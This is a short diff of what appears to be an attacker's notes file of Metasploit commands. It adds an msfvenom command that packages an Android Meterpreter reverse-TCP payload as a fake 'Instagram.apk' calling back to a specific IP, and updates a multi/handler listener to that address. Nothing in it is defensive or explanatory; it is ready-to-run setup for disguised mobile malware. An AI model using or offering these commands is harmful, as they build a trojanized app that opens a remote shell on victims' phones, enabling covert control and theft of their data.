@@ -8,6 +8,10 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.41.217.209 LPORT=4444 R> In
 
 
 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=100.95.197.169 LPORT=4444 R> Instagram.apk
+
+
+
 
 
 
@@ -22,7 +26,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.41.253.179 LPORT=4444 R> pa
 
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
-set LHOST 10.41.217.209
+set LHOST 100.95.197.169
 set LPORT 4444 
 exploit
 
